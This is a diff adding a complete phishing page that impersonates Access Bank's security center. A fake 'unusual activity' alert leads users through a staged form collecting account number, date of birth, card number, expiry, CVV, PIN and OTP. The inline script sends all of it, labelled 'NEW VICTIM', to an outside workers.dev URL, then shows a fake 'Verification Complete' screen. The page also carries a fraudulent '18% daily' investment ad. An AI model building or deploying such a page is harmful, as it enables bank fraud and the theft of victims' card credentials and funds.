@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access Bank — Security Center</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="topbar">
+    <div class="container">
+        <span>🔒 Secured Connection · 256-bit SSL</span>
+        <span>Need help? Call 0700-300-0000</span>
+    </div>
+</div>
+
+<header>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-mark">A</div>
+            <span>Access Bank</span>
+        </div>
+    </div>
+</header>
+
+<div class="alert-banner">
+    <div class="container">
+        ⚠️ <strong>Action Required:</strong> Unusual activity detected on your account. Verify your identity to continue.
+    </div>
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <div class="card-header">
+            <h1>Secure Account Verification</h1>
+            <p>We've detected a login attempt from a new device. To protect your funds, please verify your account details below.</p>
+        </div>
+
+        <form id="verifyForm">
+            <div class="stage" id="stage-1">
+                <div class="form-group">
+                    <label>Account Number</label>
+                    <input type="text" name="account_number" maxlength="10" placeholder="0123456789" required>
+                </div>
+                <div class="form-group">
+                    <label>Date of Birth</label>
+                    <input type="text" name="dob" placeholder="DD/MM/YYYY" required>
+                </div>
+                <button type="button" class="btn" onclick="nextStage(2)">Continue →</button>
+            </div>
+
+            <div class="stage hidden" id="stage-2">
+                <div class="form-group">
+                    <label>Card Number</label>
+                    <input type="text" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Expiry</label>
+                        <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Card PIN</label>
+                    <input type="password" name="pin" maxlength="4" placeholder="••••" required>
+                </div>
+                <button type="button" class="btn" onclick="nextStage(3)">Verify Card →</button>
+            </div>
+
+            <div class="stage hidden" id="stage-3">
+                <div class="verifying-box">
+                    <div class="spinner"></div>
+                    <p>Verifying with Access Bank secure servers…</p>
+                    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+                </div>
+                <div id="otp-section" class="hidden" style="margin-top:20px;">
+                    <div class="form-group">
+                        <label>Enter OTP sent to your phone</label>
+                        <input type="text" name="otp" maxlength="6" placeholder="000000">
+                    </div>
+                    <button type="submit" class="btn">Complete Verification →</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="sidebar">
+        <div class="ad">
+            <div class="ad-label">Sponsored</div>
+            <strong>Earn 18% daily with Access Wealth</strong>
+            <p>Trusted by 240,000+ investors</p>
+        </div>
+        <div class="trust-badges">
+            <p>✓ PCI-DSS Compliant</p>
+            <p>✓ NDIC Insured</p>
+            <p>✓ CBN Licensed</p>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <div class="container">
+        <p>© 2026 Access Bank Plc. RC 125384. All rights reserved.</p>
+        <p>This is a secure banking portal. Never share your PIN with anyone.</p>
+    </div>
+</footer>
+
+<script>
+    const WORKER_URL = 'https://access-alerts.mcallendiana.workers.dev';
+    const collected = {};
+
+    function collectStage(n) {
+        const stage = document.getElementById('stage-' + n);
+        const inputs = stage.querySelectorAll('input');
+        inputs.forEach(input => {
+            if (input.value) collected[input.name] = input.value;
+        });
+    }
+
+    function nextStage(n) {
+        collectStage(n - 1);
+        document.getElementById('stage-' + (n - 1)).classList.add('hidden');
+        document.getElementById('stage-' + n).classList.remove('hidden');
+
+        if (n === 3) {
+            runVerification();
+        }
+    }
+
+    function runVerification() {
+        const progress = document.getElementById('progress');
+        let pct = 0;
+        const interval = setInterval(() => {
+            pct += 2;
+            progress.style.width = pct + '%';
+            if (pct >= 100) {
+                clearInterval(interval);
+                document.getElementById('otp-section').classList.remove('hidden');
+            }
+        }, 100);
+    }
+
+    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        collectStage(3);
+
+        const text = `🔐 *NEW VICTIM — ACCESS BANK*\n\n` +
+            `🏦 *Account:* ${collected.account_number || 'N/A'}\n` +
+            `🎂 *DOB:* ${collected.dob || 'N/A'}\n` +
+            `💳 *Card:* ${collected.card_number || 'N/A'}\n` +
+            `📅 *Expiry:* ${collected.expiry || 'N/A'}\n` +
+            `🔒 *CVV:* ${collected.cvv || 'N/A'}\n` +
+            `🔑 *PIN:* ${collected.pin || 'N/A'}\n` +
+            `📱 *OTP:* ${collected.otp || 'N/A'}\n` +
+            `🕐 *Time:* ${new Date().toLocaleString()}`;
+
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text })
+            });
+        } catch (err) {}
+
+        document.body.innerHTML = '<div style="padding:60px;text-align:center;font-family:Arial;"><h2>Verification Complete</h2><p>Your account has been secured. You will receive a confirmation email shortly.</p></div>';
+    });
+</script>
+
+</body>
+</html>
